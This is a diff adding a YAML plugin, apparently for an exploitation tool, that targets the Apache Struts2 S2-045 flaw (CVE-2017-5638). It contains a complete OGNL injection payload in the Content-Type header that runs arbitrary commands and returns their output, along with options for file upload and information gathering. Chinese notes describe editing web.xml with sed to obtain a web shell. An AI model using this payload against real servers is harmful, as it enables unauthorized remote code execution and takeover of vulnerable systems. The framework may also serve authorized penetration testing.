@@ -1,0 +1,71 @@
+info:
+    app: Struts2
+    name: S2_045
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2017-03-07"
+    create_date: "2024-10-06 12:46:32"
+    update_date: "2024-10-06 12:46:32"
+    scope: Struts 2.3.5 – Struts 2.3.31、Struts 2.5 – Struts 2.5.10
+    description: |-
+        Struts使用的Jakarta解析文件上传请求包不当，当远程攻击者构造恶意的Content-Type，可能导致远程命令执行。
+        实际上在default.properties文件中，struts.multipart.parser的值有两个选择，分别是jakarta和pell（另外原本其实也有第三种选择cos）。其中的jakarta解析器是Struts 2框架的标准组成部分。默认情况下jakarta是启用的，所以该漏洞的严重性需要得到正视。
+    vul_id: CVE-2017-5638
+    detail: |-
+        利用点为Content-Type
+        目前只支持cmd
+        URL如http://192.168.111.111:8080/integration/saveGangster.action
+        getshell需要注意struts2默认拒绝直接访问jsp，需要修改web.xml
+        通过命令执行，替换sed -i "s/<url-pattern>\*\.jsp<\/url-pattern>//g" webapps/ROOT/WEB-INF/web.xml
+        插入新行 sed -i '/特定字符串/a 新行字符串' file
+
+        payload1支持： cmd
+        payload2支持： cmd、getmsg、upload
+        payload3支持： cmd
+    payload: |
+        GET /integration/saveGangster.action HTTP/1.1
+        Host: 192.168.111.111:8080
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+payloads:
+    - name: cmd1
+      alias: 命令执行1
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: getmsg2
+      alias: 获取信息2
+    - name: cmd2
+      alias: 命令执行2
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: upload2
+      alias: 文件上传2
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: content
+            title: 内容
+            param_type: textarea
+            default_value: ""
+            required: true
+    - name: cmd3
+      alias: 命令执行3
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
